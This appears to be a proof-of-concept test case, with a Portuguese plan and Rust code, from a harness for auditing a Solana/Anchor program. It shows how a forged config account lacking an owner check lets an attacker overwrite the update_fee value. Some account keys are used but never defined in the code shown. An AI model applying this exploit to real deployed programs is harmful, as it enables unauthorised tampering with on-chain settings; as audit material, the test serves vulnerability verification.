{
  "plan": "Preparamos uma conta `config` legítima com dono do programa e admin = autoridade, e uma conta forjada pelo atacante com dono diferente (System Program) cujos bytes 8..40 contêm a pubkey do atacante. O baseline chama `update_fee` com a conta legítima e a autoridade correta, provando que o cenário está montado. O ataque chama `update_fee` com a conta forjada e o atacante como signer; como não há checagem de owner, a comparação passa e o campo fee (bytes 40..48) da conta forjada é sobrescrito. O efeito mede que a conta forjada, com dono diferente do programa, teve seu fee alterado para o valor do ataque.",
  "scenario": "let program_id = env.program_id;
let attacker = Pubkey::new_unique();
let legit_admin = Pubkey::new_unique();

// Conta legítima: dono do programa, admin = legit_admin, fee inicial 100
let mut legit_data = anchor_account_data("AdminConfig", &(legit_admin, 100u64));
let legit_config = account(&program_id, &legit_data, None);

// Conta forjada: dono System Program, admin = attacker, fee inicial 100
let mut forged_data = anchor_account_data("AdminConfig", &(attacker, 100u64));
let forged_config = account(&solana_sdk::system_program::id(), &forged_data, None);

// Baseline: uso legítimo com a conta legítima e o admin correto
let ix_baseline = env.anchor_ix(
    "update_fee",
    &(200u64,),
    vec![
        AccountMeta::new(legit_config_key, false),
        AccountMeta::new_readonly(legit_admin, true),
    ],
);
let contas_baseline = vec![
    (legit_config_key, legit_config.clone()),
    (legit_admin, wallet(1_000_000_000)),
];
let r_base = env.baseline("update_fee legitimo", &ix_baseline, &contas_baseline);

// Ataque: conta forjada com dono System Program, atacante como signer
let ix_attack = env.anchor_ix(
    "update_fee",
    &(999u64,),
    vec![
        AccountMeta::new(forged_config_key, false),
        AccountMeta::new_readonly(attacker, true),
    ],
);
let contas_attack = vec![
    (forged_config_key, forged_config.clone()),
    (attacker, wallet(1_000_000_000)),
];
let r = env.attack("update_fee com conta forjada", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let after_forged = after(&r, &forged_config_key);
    env.effect(
        "conta forjada (dono != programa) teve fee sobrescrito para 999",
        read_u64(after_forged.data(), 40) == 999u64,
    );
    env.effect(
        "conta forjada mantem dono diferente do programa",
        after_forged.owner() != &program_id,
    );
}"
}

